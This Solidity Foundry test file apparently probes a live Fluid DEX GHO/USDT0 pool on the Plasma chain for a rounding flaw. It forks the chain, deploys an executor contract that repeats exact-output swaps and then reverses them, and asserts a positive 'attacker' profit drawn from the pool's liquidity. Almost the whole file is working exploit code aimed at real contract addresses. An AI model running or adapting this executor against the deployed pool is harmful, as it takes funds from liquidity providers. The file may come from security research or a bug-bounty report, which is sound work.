// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import {Test} from "forge-std/Test.sol";

interface IERC20Plateau {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IFluidDexPlateau {
    function swapOut(bool swap0to1, uint256 amountOut, uint256 amountInMax, address to)
        external payable returns (uint256 amountIn);
    function swapIn(bool swap0to1, uint256 amountIn, uint256 amountOutMin, address to)
        external payable returns (uint256 amountOut);
}

contract PlasmaPlateauExecutor {
    address internal constant POOL = 0x080574D224E960c272e005aA03EFbe793f317640;
    address internal constant GHO = 0xb77E872A68C62CfC0dFb02C067Ecc3DA23B4bbf3;
    address internal constant USDT0 = 0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb;

    constructor() {
        require(IERC20Plateau(GHO).approve(POOL, type(uint256).max), "GHO_APPROVE");
        require(IERC20Plateau(USDT0).approve(POOL, type(uint256).max), "USDT_APPROVE");
    }

    function reverseExactOutput(uint256 rounds, uint256 ghoOutEach)
        external returns (uint256 totalUsdtInput, uint256 reverseGhoInput)
    {
        for (uint256 i; i < rounds; ++i) {
            totalUsdtInput += IFluidDexPlateau(POOL).swapOut(
                false, ghoOutEach, type(uint256).max, address(this)
            );
        }
        reverseGhoInput = IFluidDexPlateau(POOL).swapOut(
            true, totalUsdtInput, type(uint256).max, address(this)
        );
    }

    function reverseExactInput(uint256 rounds, uint256 ghoOutEach)
        external returns (uint256 totalUsdtInput, uint256 ghoReverseInput, uint256 usdtReverseOutput)
    {
        for (uint256 i; i < rounds; ++i) {
            totalUsdtInput += IFluidDexPlateau(POOL).swapOut(
                false, ghoOutEach, type(uint256).max, address(this)
            );
        }
        ghoReverseInput = IERC20Plateau(GHO).balanceOf(address(this));
        usdtReverseOutput = IFluidDexPlateau(POOL).swapIn(
            true, ghoReverseInput, 0, address(this)
        );
    }
}

contract PlasmaGhoUsdtPlateauAndReverseModesTest is Test {
    address internal constant POOL = 0x080574D224E960c272e005aA03EFbe793f317640;
    address internal constant LIQUIDITY = 0x52Aa899454998Be5b000Ad077a46Bbe360F4e497;
    address internal constant GHO = 0xb77E872A68C62CfC0dFb02C067Ecc3DA23B4bbf3;
    address internal constant USDT0 = 0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    bytes4 internal constant SWAP_RESULT = bytes4(keccak256("FluidDexSwapResult(uint256)"));
    uint256 internal constant ROUNDS = 32;

    event PlateauCandidate(
        uint256 targetUsdtInputRaw,
        uint256 ghoOutEach,
        uint8 reverseMode,
        int256 attackerUsdtDelta,
        int256 attackerGhoDelta,
        int256 liquidityUsdtDelta,
        int256 liquidityGhoDelta,
        int256 parityValueDelta18,
        uint256 gasUsed
    );

    event PlateauCandidateRevert(
        uint256 targetUsdtInputRaw,
        uint256 ghoOutEach,
        uint8 reverseMode,
        bytes4 selector,
        uint256 errorId
    );

    event PlateauSearchBest(
        int256 bestParityValueDelta18,
        uint256 successfulCandidates,
        uint256 revertedCandidates
    );

    function setUp() public {
        vm.createSelectFork(vm.envString("PLASMA_RPC_URL"));
        assertEq(block.chainid, 9745, "unexpected chain");
    }

    function _quoteUsdtIn(uint256 ghoOut) internal returns (bool valid, uint256 usdtIn) {
        (bool ok, bytes memory data) = POOL.call(
            abi.encodeCall(IFluidDexPlateau.swapOut, (false, ghoOut, type(uint256).max, DEAD))
        );
        if (ok || data.length < 36) return (false, 0);
        bytes4 selector;
        assembly ("memory-safe") {
            selector := mload(add(data, 32))
            usdtIn := mload(add(data, 36))
        }
        valid = selector == SWAP_RESULT;
    }

    function _maxGhoOutAtOrBelow(uint256 targetUsdtInputRaw) internal returns (uint256 best) {
        uint256 low = 1e12;
        uint256 high = targetUsdtInputRaw * 4e12 + 1e12;
        for (uint256 i; i < 72; ++i) {
            uint256 mid = low + (high - low) / 2;
            (bool valid, uint256 quote) = _quoteUsdtIn(mid);
            if (valid && quote <= targetUsdtInputRaw) {
                best = mid;
                low = mid + 1;
            } else {
                if (mid == 0) break;
                high = mid - 1;
            }
            if (low > high) break;
        }
    }

    function _target(uint256 i) internal pure returns (uint256) {
        uint256[9] memory values = [
            uint256(100), 255, 1_000, 10_000, 100_000,
            1_000_000, 10_000_000, 100_000_000, 1_000_000_000
        ];
        return values[i];
    }

    function _deltas(
        address executor,
        uint256 usdtBefore,
        uint256 ghoBefore,
        uint256 lUsdtBefore,
        uint256 lGhoBefore
    ) internal view returns (int256 aUsdt, int256 aGho, int256 lUsdt, int256 lGho) {
        aUsdt = int256(IERC20Plateau(USDT0).balanceOf(executor)) - int256(usdtBefore);
        aGho = int256(IERC20Plateau(GHO).balanceOf(executor)) - int256(ghoBefore);
        lUsdt = int256(IERC20Plateau(USDT0).balanceOf(LIQUIDITY)) - int256(lUsdtBefore);
        lGho = int256(IERC20Plateau(GHO).balanceOf(LIQUIDITY)) - int256(lGhoBefore);
    }

    function _runCandidateInner(uint256 target, uint256 amountOut, uint8 mode)
        internal returns (int256 parityValue)
    {
        PlasmaPlateauExecutor executor = new PlasmaPlateauExecutor();
        deal(USDT0, address(executor), 2_000_000_000_000_000);
        uint256 usdtBefore = IERC20Plateau(USDT0).balanceOf(address(executor));
        uint256 ghoBefore = IERC20Plateau(GHO).balanceOf(address(executor));
        uint256 lUsdtBefore = IERC20Plateau(USDT0).balanceOf(LIQUIDITY);
        uint256 lGhoBefore = IERC20Plateau(GHO).balanceOf(LIQUIDITY);

        uint256 gasBefore = gasleft();
        if (mode == 0) {
            executor.reverseExactOutput(ROUNDS, amountOut);
        } else {
            executor.reverseExactInput(ROUNDS, amountOut);
        }
        uint256 gasUsed = gasBefore - gasleft();

        (int256 aUsdt, int256 aGho, int256 lUsdt, int256 lGho) = _deltas(
            address(executor), usdtBefore, ghoBefore, lUsdtBefore, lGhoBefore
        );
        parityValue = aGho + aUsdt * int256(1e12);

        assertEq(aUsdt, -lUsdt, "USDT conservation");
        assertEq(aGho, -lGho, "GHO conservation");
        emit PlateauCandidate(target, amountOut, mode, aUsdt, aGho, lUsdt, lGho, parityValue, gasUsed);
    }

    function runCandidate(uint256 target, uint256 amountOut, uint8 mode)
        external returns (int256 parityValue)
    {
        require(msg.sender == address(this), "SELF_ONLY");
        return _runCandidateInner(target, amountOut, mode);
    }

    function _decode(bytes memory reason) internal pure returns (bytes4 selector, uint256 errorId) {
        if (reason.length >= 4) {
            assembly ("memory-safe") {
                selector := mload(add(reason, 32))
            }
        }
        if (reason.length >= 36) {
            assembly ("memory-safe") {
                errorId := mload(add(reason, 36))
            }
        }
    }

    function _tryCandidate(uint256 target, uint256 amountOut, uint8 mode)
        internal returns (bool success, int256 parityValue)
    {
        try this.runCandidate(target, amountOut, mode) returns (int256 value) {
            return (true, value);
        } catch (bytes memory reason) {
            (bytes4 selector, uint256 errorId) = _decode(reason);
            emit PlateauCandidateRevert(target, amountOut, mode, selector, errorId);
            return (false, 0);
        }
    }

    function test_searchBroadInputPlateausAndReverseModes() public {
        int256 bestParityValue;
        uint256 successfulCandidates;
        uint256 revertedCandidates;

        for (uint256 i; i < 9; ++i) {
            uint256 target = _target(i);
            uint256 amountOut = _maxGhoOutAtOrBelow(target);
            if (amountOut == 0) continue;

            for (uint8 mode; mode < 2; ++mode) {
                uint256 snap = vm.snapshot();
                (bool success, int256 value) = _tryCandidate(target, amountOut, mode);
                if (success) {
                    ++successfulCandidates;
                    if (value > bestParityValue) bestParityValue = value;
                } else {
                    ++revertedCandidates;
                }
                require(vm.revertTo(snap), "RESTORE_FAILED");
            }
        }

        emit PlateauSearchBest(bestParityValue, successfulCandidates, revertedCandidates);
        assertGt(bestParityValue, 0, "no positive closed cycle");
        assertGt(successfulCandidates, 0, "all candidates reverted");
    }
}
